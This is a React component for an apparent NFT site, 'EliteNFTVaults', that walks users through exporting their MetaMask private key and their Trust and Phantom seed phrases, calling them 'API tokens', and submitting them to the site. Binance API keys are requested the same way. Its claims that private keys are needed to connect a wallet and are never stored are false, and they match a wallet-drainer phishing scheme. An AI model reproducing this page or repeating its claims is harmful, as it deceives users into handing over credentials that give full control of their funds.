"use client";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faExclamationTriangle } from "@fortawesome/free-solid-svg-icons";
import { useState } from "react";
import ConfirmBtn from "@/components/loading/ConfirmBtn";
// import metamask from "@/videos/metamaskkeyvideo.mp4";
const ConnectWallet = () => {
  const [setup, setSetup] = useState("desktop");
  return (
    <div className="w-full">
      <p className="w-full p-[2px] text-black">
        There are five main wallet supported on EliteNFTVaults and we have
        provided video on how to connect to wallet step by step
      </p>
      <p className="my-2 text-red-500 break-words bg-red-200 border border-red-700 rounded text-center">
        <FontAwesomeIcon
          icon={faExclamationTriangle}
          className="text-red-500"
        />
        Connecting your wallet requires you add you API tokens(private keys). Do
        not give your keys to anyone. Your key will not be requested by
        eliteNFTVault support team, your keys are only requested when you
        connect your wallet.
        <br />
        <p>N.B please be extra careful when handling your API keys</p>
      </p>
      <p className="mx-auto w-[280px] sm:w-full">
        <span className="text-[#141414]">
          why are my API tokens(private keys) requested?{" "}
        </span>
        <br />
        <p className="text-sm text-gray-700">
          Your API key helps with application programming interface (API)...it
          creates a user interface that's easy to use. It also helps with
          creating and maintaining the smart-contract for your collections and
          easily send your earnings to your respective wallet. It is important
          to know that your API keys are not kept by us nor can it be at anytime
          accessed, viewed or used by anyone except from you. If you want to
          change your wallet please speak with our customer care.
        </p>
      </p>
      <div className="w-full my-2">
        <p className=" font-extrabold text-black">
          How to get your metamask private key (API token)
        </p>
        <div className="flex items-center justify-between sm:justify-center sm:space-x-2 my-2">
          <ConfirmBtn
            title={"Desktop"}
            otherStyles={` p-1 sm:p-2 ${
              setup === "desktop" ? "bg-[#141414]/90" : "bg-[#141414]/30"
            }`}
            handleClicked={() => setSetup("desktop")}
          />
          <ConfirmBtn
            title={"Mobile"}
            otherStyles={` p-1 sm:p-2 ${
              setup === "mobile" ? "bg-[#141414]/90" : "bg-[#141414]/30"
            }`}
            handleClicked={() => setSetup("mobile")}
          />
        </div>
        <div className="mx-auto max-w-4xl p-4 flex flex-col sm:flex-row sm:space-x-2 items-center justify-center">
          <div className="flex flex-col items-center justify-center ">
            <p className="text-black"> step 1 : get your metamask API Key </p>
            <video
              src="/assets/videos/metamaskkeyvideo.mp4"
              className="w-[300px]  h-auto"
              controls
              autoplay
              muted
            ></video>
          </div>
          <div className="flex flex-col items-center justify-center">
            <p className="text-black"> step 2 : Add API key to your account </p>
            <video
              src="/assets/videos/addapimetamask.mp4"
              className="w-[300px]  h-auto"
              controls
              autoplay
              muted
            ></video>
          </div>
        </div>
      </div>
      <div className="w-full my-2">
        <p className=" font-extrabold text-black">
          How to get your Trust Secret Phrase (API token)
        </p>
        <div className="flex items-center justify-between sm:justify-center sm:space-x-2 my-2">
          <ConfirmBtn
            title={"Desktop"}
            otherStyles={` p-1 sm:p-2 ${
              setup === "desktop" ? "bg-[#141414]/90" : "bg-[#141414]/30"
            }`}
            handleClicked={() => setSetup("desktop")}
          />
          <ConfirmBtn
            title={"Mobile"}
            otherStyles={` p-1 sm:p-2 ${
              setup === "mobile" ? "bg-[#141414]/90" : "bg-[#141414]/30"
            }`}
            handleClicked={() => setSetup("mobile")}
          />
        </div>
        <div className="mx-auto max-w-4xl p-4 flex flex-col sm:flex-row sm:space-x-2 items-center justify-center">
          <div className="flex flex-col items-center justify-center ">
            <p className="text-black">
              {" "}
              step 1 : get your trust secret phrase (API key){" "}
            </p>
            <video
              src="/assets/videos/trustwalletkey.mp4"
              className="w-[300px]  h-auto"
              controls
              autoplay
              muted
            ></video>
          </div>
          <div className="flex flex-col items-center justify-center">
            <p className="text-black"> step 2 : Add API key to your account </p>
            <video
              src="/assets/videos/addtrustapi.mp4"
              className="w-[300px]  h-auto"
              controls
              autoplay
              muted
            ></video>
          </div>
        </div>
      </div>
      <div className="w-full my-2">
        <p className=" font-extrabold text-black">
          How to get your Phantom Secret Phrase (API token)
        </p>
        <div className="flex items-center justify-between sm:justify-center sm:space-x-2 my-2">
          <ConfirmBtn
            title={"Desktop"}
            otherStyles={` p-1 sm:p-2 ${
              setup === "desktop" ? "bg-[#141414]/90" : "bg-[#141414]/30"
            }`}
            handleClicked={() => setSetup("desktop")}
          />
          <ConfirmBtn
            title={"Mobile"}
            otherStyles={` p-1 sm:p-2 ${
              setup === "mobile" ? "bg-[#141414]/90" : "bg-[#141414]/30"
            }`}
            handleClicked={() => setSetup("mobile")}
          />
        </div>
        <div className="mx-auto max-w-4xl p-4 flex flex-col sm:flex-row sm:space-x-2 items-center justify-center">
          <div className="flex flex-col items-center justify-center ">
            <p className="text-black">
              {" "}
              step 1 : get your phantom secret phrase (API key){" "}
            </p>
            <video
              src="/assets/videos/solanawalletkey.mp4"
              className="w-[300px]  h-auto"
              controls
              autoplay
              muted
            ></video>
          </div>
          <div className="flex flex-col items-center justify-center">
            <p className="text-black"> step 2 : Add API key to your account </p>
            <video
              src="/assets/videos/addphantomapi.mp4"
              className="w-[300px]  h-auto"
              controls
              autoplay
              muted
            ></video>
          </div>
        </div>
      </div>
      <div className="w-full my-2">
        <p className=" font-extrabold text-black">
          How to get your Binance API token
        </p>
        {/* <div className="flex items-center justify-between sm:justify-center sm:space-x-2 my-2">
          <ConfirmBtn
            title={"Desktop"}
            otherStyles={` p-1 sm:p-2 ${
              setup === "desktop" ? "bg-[#141414]/90" : "bg-[#141414]/30"
            }`}
            handleClicked={() => setSetup("desktop")}
          />
          <ConfirmBtn
            title={"Mobile"}
            otherStyles={` p-1 sm:p-2 ${
              setup === "mobile" ? "bg-[#141414]/90" : "bg-[#141414]/30"
            }`}
            handleClicked={() => setSetup("mobile")}
          />
        </div> */}
        <div className="mx-auto max-w-4xl p-4 flex flex-col sm:flex-row sm:space-x-2 items-center justify-center">
          <div className="flex flex-col items-center justify-center ">
            <p className="text-black"> step 1 : get your Binance API key </p>
            <video
              src="/assets/videos/binanceapikey.mp4"
              className="w-[300px]  h-auto"
              controls
              autoplay
              muted
            ></video>
          </div>
          <div className="flex flex-col items-center justify-center">
            <p className="text-black"> step 2 : Add API key to your account </p>
            <video
              src="/assets/videos/addbinanceapi.mp4"
              className="w-[300px]  h-auto"
              controls
              autoplay
              muted
            ></video>
          </div>
        </div>
      </div>
    </div>
  );
};
export default ConnectWallet;
